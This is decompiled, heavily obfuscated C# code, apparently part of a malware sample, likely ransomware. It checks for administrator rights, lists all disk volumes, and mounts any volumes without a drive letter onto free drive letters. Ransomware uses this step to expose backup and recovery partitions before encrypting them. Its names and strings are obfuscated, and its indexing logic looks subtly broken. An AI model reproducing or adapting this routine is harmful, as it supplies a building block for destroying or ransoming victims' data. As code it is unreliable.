using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

public static class yxuAcsDUPCh
{
	public enum ZkCTbFVwDzOgNmh : uint
	{
		VWikcKykJvWcuynqr,
		ysuNhqAcFwRDxcGX,
		gRhKslOuhe,
		jfeDzEpTDTzZbk,
		nKUyVVQmpMsHKM,
		seoaXbQaymTfSXz,
		MbBIVtCrFHwZ
	}

	private sealed class plTaCdPKitdFi
	{
		public uint eDqkLIyGQtNHB;

		public uint RPNDoLATtUz;

		public char[] WHMCWRfMXkRIF;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			return !GetVolumePathNamesForVolumeNameW(string_0, WHMCWRfMXkRIF, RPNDoLATtUz, ref eDqkLIyGQtNHB) || WHMCWRfMXkRIF.Length != 3;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern ZkCTbFVwDzOgNmh GetDriveType([MarshalAs(UnmanagedType.LPStr)] string dQhPJDXBQVpz);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string KSLRvFLHcgYi, char[] UXSiJcRegq, uint POamJIWOCvK, ref uint xKsjixpqvJqM);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> UfmQlYAhkiQ()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void zzEETqbmpTBbHvp()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			plTaCdPKitdFi CS_0024_003C_003E8__locals0 = new plTaCdPKitdFi();
			string[] array = new string[26]
			{
				getString_0(107361082),
				getString_0(107361045),
				getString_0(107361040),
				getString_0(107361035),
				getString_0(107361030),
				getString_0(107361057),
				getString_0(107361052),
				getString_0(107361047),
				getString_0(107361522),
				getString_0(107361517),
				getString_0(107361512),
				getString_0(107361539),
				getString_0(107361534),
				getString_0(107361529),
				getString_0(107361492),
				getString_0(107361487),
				getString_0(107361482),
				getString_0(107361509),
				getString_0(107361504),
				getString_0(107361499),
				getString_0(107361494),
				getString_0(107361457),
				getString_0(107361452),
				getString_0(107361447),
				getString_0(107361474),
				getString_0(107361469)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == ZkCTbFVwDzOgNmh.ysuNhqAcFwRDxcGX)
				{
					array2[num++] = text;
				}
			}
			List<string> source = UfmQlYAhkiQ();
			CS_0024_003C_003E8__locals0.eDqkLIyGQtNHB = 0u;
			CS_0024_003C_003E8__locals0.RPNDoLATtUz = 120u;
			CS_0024_003C_003E8__locals0.WHMCWRfMXkRIF = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.WHMCWRfMXkRIF, CS_0024_003C_003E8__locals0.RPNDoLATtUz, ref CS_0024_003C_003E8__locals0.eDqkLIyGQtNHB) || CS_0024_003C_003E8__locals0.WHMCWRfMXkRIF.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (UzNyTypkvLt.vgTZYvMerotpU)
				{
					try
					{
						Console.WriteLine(getString_0(107361464), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (UzNyTypkvLt.XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(UzNyTypkvLt.IuaKWfBuBpJ, getString_0(107361439) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static yxuAcsDUPCh()
	{
		Strings.CreateGetStringDelegate(typeof(yxuAcsDUPCh));
	}
}
